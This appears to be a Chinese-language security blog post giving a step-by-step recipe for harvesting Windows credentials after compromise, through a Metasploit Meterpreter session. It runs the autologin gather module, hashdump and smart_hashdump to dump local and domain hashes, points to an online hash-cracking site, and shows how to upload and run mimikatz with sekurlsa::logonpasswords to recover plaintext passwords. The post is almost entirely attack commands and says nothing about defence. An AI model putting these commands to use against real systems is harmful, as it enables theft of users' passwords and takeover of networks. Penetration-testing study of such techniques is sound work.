---
title: 使用MSF抓取用户密码
abbrlink: b034a3f3
date: 2024-10-23 21:00:00
tags: ['安全', 'Linux']
---

## 抓取自动登录的密码
很多用户习惯将计算机设置自动登录
可以使用
~~~bash
run windows/gather/credentials/windows_autologin
~~~
抓取自动登录的用户名和密码

## 导出密码哈希
### run hashdump 命令
> `hashdump` 模块可以从 `SAM数据库` 中导出本地用户账号，该命令的使用需要系统权限

- 在 `meterpreter_shell` 中执行 `run hashdump` 命令
~~~bash
run hashdump
~~~

- 用户哈希数据的输出格式为
~~~bash
用户名:SID:LM哈希:NTLM哈希:::
~~~

- 使用在线网站解密hash密码
[CMD5](https://www.cmd5.com/default.aspx)

- `run windows/gather/smart_hashdump` 命令
> 使用需要系统权限。该功能更强大
> 如果当前用户是域管理员用户
> 则可以导出域内所有用户的 hash

## 使用 mimikatx 抓取密码
### 上传 mimikatz 程序
我们可以通过上传 `mimikatz` 程序
然后执行 `mimikatz` 程序来`获取明文密码`

- 前提
执行 `mimikatz` 必须 `System` 权限
并且在执行时，要根据当前的系统位数进行选择

- 使用方法
1. 在 `meterpreter_shell` 的命令行里面查看当前会话的权限
~~~bash
getuid
~~~

2. 查看系统位数
~~~bash
sysinfo
~~~

3. 选择相应位数的 `mimikatz` 上传至目标服务器
~~~bash
upload file  #upload命令后面需要跟上要上传文件的路径；这个命令是从当前机器上传到目标机器；
~~~

4. 进入 `mimikatz` 的交互界面
~~~bash
execute -i -f mimikatz.exe
~~~

5. 在 `mimikatz` 交互界面，使用以下两条命令抓取密码
~~~bash
privilege::debug
sekurlsa::logonpasswords
~~~
